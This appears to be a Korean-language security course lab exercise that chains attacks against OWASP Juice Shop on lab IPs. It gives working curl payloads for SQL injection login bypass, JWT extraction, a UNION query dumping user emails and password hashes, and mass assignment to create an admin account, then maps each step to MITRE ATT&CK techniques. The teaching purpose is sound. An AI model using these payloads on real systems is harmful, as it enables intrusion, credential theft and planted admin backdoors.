    ## 상황 (w03 → w04 시나리오 연속)

    > 선임: "정찰 끝났으면 익스플로잇. 한 취약점만 쓰면 의미 없어 — *chain* 이 진짜야.
    > SQLi → UNION → Mass Assignment. ATT&CK 매핑까지."

    학습 목표 (lecture #2·#3·#4 SQLi + sqlmap) + (lab #1·#5·#4 SQLi auth/UNION/Mass) 통합.

    ## 임무 (3 단계, 약 35분)

    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.

    ### Phase A — SQLi 인증 우회 + JWT
    `curl -s -X POST -H "Content-Type: application/json" -d "{\"email\":\"admin@juice-sh.op' OR 1=1--\",\"password\":\"x\"}" http://10.20.30.80:3000/rest/user/login | head -c 500`
    `JWT=$(curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80:3000/rest/user/login | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('authentication',{}).get('token',''))" 2>/dev/null)`
    `echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null`

    ### Phase B — UNION + Mass Assignment
    `curl -s "http://10.20.30.80:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,role,createdAt,updatedAt,deletedAt%20FROM%20Users--" | head -c 500`
    `curl -s -i -X POST -H "Content-Type: application/json" -d '{"email":"chain'$(date +%s)'@x.com","password":"Test1234!","role":"admin","isAdmin":true}' http://10.20.30.80:3000/api/Users/ | head -20`

    ### Phase C — ATT&CK 매트릭스
    | ATT&CK | 단계 | 페이로드 | 결과 |
    | T1190 Exploit Public-Facing | Initial Access | ' OR 1=1-- | admin JWT/차단 |
    | T1078 Valid Accounts | Initial Access | UNION → email/hash | 자격증명 |
    | T1068 Exploit Priv Esc | Privilege Escalation | role:admin | admin 등록 |
    | T1136 Create Account | Persistence | mass assignment | 백도어 |
    | T1213 Data from Repositories | Collection | UNION DB | 사용자 dump |
    표 끝 "w05 입력: admin JWT → 횡적 이동." 한 줄.

    종료: echo "=== Phase A SQLi+JWT ===" / "=== Phase B UNION+Mass ===" / "=== Phase C ATT&CK ===".
